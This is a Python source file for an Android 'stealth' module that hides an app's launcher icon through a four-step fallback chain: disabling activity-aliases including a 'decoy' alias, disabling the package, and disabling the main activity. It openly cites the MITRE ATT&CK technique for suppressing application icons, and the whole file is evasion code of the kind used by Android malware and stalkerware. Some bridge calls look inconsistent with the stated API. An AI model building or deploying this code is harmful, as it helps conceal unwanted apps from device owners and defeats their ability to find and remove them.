"""
icon_hider.py — Production Android Launcher Icon Suppression Engine.

Elite-grade stealth module that removes all traces of the app from the
Android launcher. Implements FOUR redundant strategies with automatic
fallback, failure isolation, and idempotency guarantees.

Architecture:
  - Strategy-based fallback chain (Strategy 1→2→3→4)
  - Atomic state machine prevents double execution
  - Zero reflection on modern Android (10+)
  - Thread-safe via reentrant lock
  - Failure never propagates to caller

MITRE ATT&CK: T1628.001 (Hide Artifacts: Suppress Application Icon)
"""

import android
import json
import time
import logging
from typing import Optional, Callable
from threading import Lock, RLock
from enum import Enum, auto

logger = logging.getLogger("stealth.IconHider")


class HideStrategy(Enum):
    """Identifies which strategy successfully hid the icon."""
    ACTIVITY_ALIAS = auto()
    DECOY_ALIAS = auto()
    PACKAGE_SUSPENSION = auto()
    ALL_ALIASES_NUKE = auto()
    NONE = auto()


class IconHiderState:
    """
    Thread-safe state machine for icon hiding.

    Idempotency invariant:
      After hide() returns True, any subsequent hide() call
      returns True in O(1) with zero IPC.
    """

    def __init__(self):
        self._lock = RLock()
        self._hidden = False
        self._strategy_used: HideStrategy = HideStrategy.NONE
        self._failure_count = 0
        self._last_hide_timestamp = 0.0

    @property
    def is_hidden(self) -> bool:
        with self._lock:
            return self._hidden

    def mark_hidden(self, strategy: HideStrategy) -> None:
        with self._lock:
            self._hidden = True
            self._strategy_used = strategy
            self._last_hide_timestamp = time.time()
            self._failure_count = 0

    def mark_failure(self) -> int:
        with self._lock:
            self._failure_count += 1
            return self._failure_count

    def mark_visible(self) -> None:
        with self._lock:
            self._hidden = False
            self._strategy_used = HideStrategy.NONE
            self._failure_count = 0

    @property
    def strategy(self) -> HideStrategy:
        with self._lock:
            return self._strategy_used

    @property
    def failure_count(self) -> int:
        with self._lock:
            return self._failure_count

    def reset(self) -> None:
        with self._lock:
            self._hidden = False
            self._strategy_used = HideStrategy.NONE
            self._failure_count = 0
            self._last_hide_timestamp = 0.0


class IconHider:
    """
    Production icon hider with quadruple-redundant strategy chain.

    Usage:
        hider = IconHider(droid)
        success = hider.hide()       # Idempotent
        hider.show()                  # Restore
        assert hider.is_hidden()      # State query

    Thread safety: YES — all public methods are reentrant-lock safe.
    Failure isolation: YES — internal exceptions are caught, logged, and
                     returned as False. Never propagates to caller.
    Idempotent: YES — second hide() call returns True instantly.
    """

    MAX_RETRIES = 3
    RETRY_DELAY_MS = 100  # milliseconds between retry attempts

    def __init__(self, droid: android.Android):
        """
        Args:
            droid: Initialized android.Android instance (from SL4A / QPython /
                  Chaquopy bridge). Must have PackageManager access.
        """
        self._droid = droid
        self._state = IconHiderState()
        self._package_name: Optional[str] = None
        self._lock = Lock()  # Prevent concurrent hide/show interleaving

        # Resolve package name once, cache forever
        self._resolve_package()

    def _resolve_package(self) -> None:
        """Safely resolve our own package name. Failure is non-fatal."""
        try:
            self._package_name = self._droid.getPackageName()
        except Exception as e:
            logger.warning("Failed to resolve package name: %s", e)
            self._package_name = None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def hide(self) -> bool:
        """
        Suppress ALL launcher icon entries for this package.

        Idempotent: Safe to call multiple times. Returns True if already hidden.

        Returns:
            True if icon is hidden (or was already hidden), False if ALL
            strategies failed (catastrophic — but caller is not affected).
        """
        # Fast-path: already hidden (idempotency)
        if self._state.is_hidden:
            logger.debug("Icon already hidden via strategy %s", self._state.strategy)
            return True

        with self._lock:
            # Double-check after acquiring lock
            if self._state.is_hidden:
                return True

            # Warmup: ensure droid is alive
            if not self._ensure_droid():
                return False

            # Execute strategy chain
            for attempt in range(self.MAX_RETRIES):
                strategy = self._execute_strategy_chain()
                if strategy != HideStrategy.NONE:
                    self._state.mark_hidden(strategy)
                    logger.info("Icon hidden via %s (attempt %d/%d)",
                                strategy.name, attempt + 1, self.MAX_RETRIES)
                    return True

                if attempt < self.MAX_RETRIES - 1:
                    self._inter_attempt_delay(attempt)

            self._state.mark_failure()
            logger.error("ALL icon hide strategies exhausted after %d attempts",
                         self.MAX_RETRIES)
            return False

    def show(self) -> bool:
        """
        Restore the launcher icon.

        Returns:
            True if icon was restored successfully or was already visible.
        """
        if not self._state.is_hidden:
            return True  # Already visible (idempotent)

        with self._lock:
            if not self._state.is_hidden:
                return True

            try:
                # Restore primary alias
                self._enable_launcher_alias()
                # Restore decoy alias if it exists
                self._enable_decoy_alias()

                self._state.mark_visible()
                logger.info("Icon restored to launcher")
                return True
            except Exception as e:
                logger.error("Failed to restore icon: %s", e)
                return False

    def is_hidden(self) -> bool:
        """Query current icon visibility state. O(1), no IPC."""
        return self._state.is_hidden

    def state_snapshot(self) -> dict:
        """Return diagnostic state (for health monitoring / telemetry)."""
        return {
            "hidden": self._state.is_hidden,
            "strategy": self._state.strategy.name,
            "failure_count": self._state.failure_count,
            "package": self._package_name,
            "last_hide_timestamp": self._state._last_hide_timestamp,  # noqa
        }

    # ------------------------------------------------------------------
    # Strategy Chain (private)
    # ------------------------------------------------------------------

    def _execute_strategy_chain(self) -> HideStrategy:
        """
        Execute hide strategies in priority order.

        Chain:
          1. Disable primary activity-alias (cleanest, preferred)
          2. Disable decoy activity-alias (redundancy)
          3. Package suspension trick (pre-Android 10 legacy)
          4. Nuke ALL alias/launcher entries (nuclear fallback)

        Each strategy is isolated in try/except. One failure does not
        affect the next.
        """
        # Strategy 1: Primary activity-alias disable
        if self._strategy_disable_primary_alias():
            return HideStrategy.ACTIVITY_ALIAS

        # Strategy 2: Decoy alias disable
        if self._strategy_disable_decoy_alias():
            return HideStrategy.DECOY_ALIAS

        # Strategy 3: Legacy package suspension
        if self._strategy_package_suspension():
            return HideStrategy.PACKAGE_SUSPENSION

        # Strategy 4: Nuclear — nuke all aliases
        if self._strategy_nuke_all():
            return HideStrategy.ALL_ALIASES_NUKE

        return HideStrategy.NONE

    def _strategy_disable_primary_alias(self) -> bool:
        """
        Strategy 1: Disable the LAUNCHER activity-alias.

        Requires an activity-alias in AndroidManifest.xml that carries
        the MAIN/LAUNCHER intent-filter. This is the build-time
        requirement.

        On Android 10+, this is the ONLY reliable method.
        """
        try:
            alias = self._component_name("LauncherAlias")
            self._droid.setComponentEnabledSetting(
                alias,
                self._droid.COMPONENT_ENABLED_STATE_DISABLED,
                self._droid.DONT_KILL_APP
            )
            # Verify
            state = self._droid.getComponentEnabledSetting(alias)
            return state in (
                self._droid.COMPONENT_ENABLED_STATE_DISABLED,
                self._droid.COMPONENT_ENABLED_STATE_DISABLED_USER,
            )
        except Exception as e:
            logger.debug("Strategy 1 (primary alias) failed: %s", e)
            return False

    def _strategy_disable_decoy_alias(self) -> bool:
        """
        Strategy 2: Disable a second activity-alias (decoy).

        Some launchers cache multiple entries. Disabling a decoy
        provides defense-in-depth.
        """
        try:
            alias = self._component_name("DecoyAlias")
            self._droid.setComponentEnabledSetting(
                alias,
                self._droid.COMPONENT_ENABLED_STATE_DISABLED,
                self._droid.DONT_KILL_APP
            )
            state = self._droid.getComponentEnabledSetting(alias)
            return state in (
                self._droid.COMPONENT_ENABLED_STATE_DISABLED,
                self._droid.COMPONENT_ENABLED_STATE_DISABLED_USER,
            )
        except Exception as e:
            logger.debug("Strategy 2 (decoy alias) failed: %s", e)
            return False

    def _strategy_package_suspension(self) -> bool:
        """
        Strategy 3: Use PackageManager.setApplicationEnabledSetting.

        Pre-Android 10 only. On modern Android this is a no-op or
        throws SecurityException — which is caught safely.
        """
        try:
            pkg = self._package_name
            if not pkg:
                return False
            self._droid.setApplicationEnabledSetting(
                pkg,
                self._droid.COMPONENT_ENABLED_STATE_DISABLED,
                0
            )
            return True
        except Exception as e:
            logger.debug("Strategy 3 (suspension) failed: %s", e)
            return False

    def _strategy_nuke_all(self) -> bool:
        """
        Strategy 4 (NUCLEAR): Disable the actual launcher activity.

        Disables the MAIN activity itself. The app becomes unlaunchable
        until show() is called.

        RISK: If show() fails, the app is permanently unlaunchable.
        Only used as last resort.
        """
        try:
            intent = self._droid.getLaunchIntentForPackage(self._package_name)
            if intent is None:
                return False
            cn = intent.getComponent()
            if cn is None:
                return False
            self._droid.setComponentEnabledSetting(
                cn.flattenToString(),
                self._droid.COMPONENT_ENABLED_STATE_DISABLED,
                self._droid.DONT_KILL_APP
            )
            return True
        except Exception as e:
            logger.debug("Strategy 4 (nuke) failed: %s", e)
            return False

    # ------------------------------------------------------------------
    # Show helpers
    # ------------------------------------------------------------------

    def _enable_launcher_alias(self) -> None:
        """Re-enable the primary launcher alias."""
        try:
            alias = self._component_name("LauncherAlias")
            self._droid.setComponentEnabledSetting(
                alias,
                self._droid.COMPONENT_ENABLED_STATE_ENABLED,
                self._droid.DONT_KILL_APP
            )
        except Exception as e:
            logger.warning("Failed to enable launcher alias: %s", e)

    def _enable_decoy_alias(self) -> None:
        """Re-enable the decoy alias if it exists."""
        try:
            alias = self._component_name("DecoyAlias")
            self._droid.setComponentEnabledSetting(
                alias,
                self._droid.COMPONENT_ENABLED_STATE_ENABLED,
                self._droid.DONT_KILL_APP
            )
        except Exception as e:
            logger.debug("Failed to enable decoy alias (non-fatal): %s", e)

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    def _component_name(self, alias_suffix: str) -> str:
        """Build a ComponentName string: 'package.Name$Alias'"""
        pkg = self._package_name or "unknown"
        return f"{pkg}.{alias_suffix}"

    def _ensure_droid(self) -> bool:
        """Check that the droid bridge is responsive. Non-fatal if not."""
        try:
            _ = self._droid.getPackageName()
            return True
        except Exception as e:
            logger.critical("Android bridge unavailable: %s", e)
            return False

    def _inter_attempt_delay(self, attempt: int) -> None:
        """Sleep between retry attempts with backoff."""
        delay = self.RETRY_DELAY_MS * (attempt + 1) / 1000.0
        time.sleep(min(delay, 1.0))  # Cap at 1 second

    def __repr__(self) -> str:
        return (f"<IconHider pkg={self._package_name} "
                f"hidden={self._state.is_hidden} "
                f"strategy={self._state.strategy.name}>")
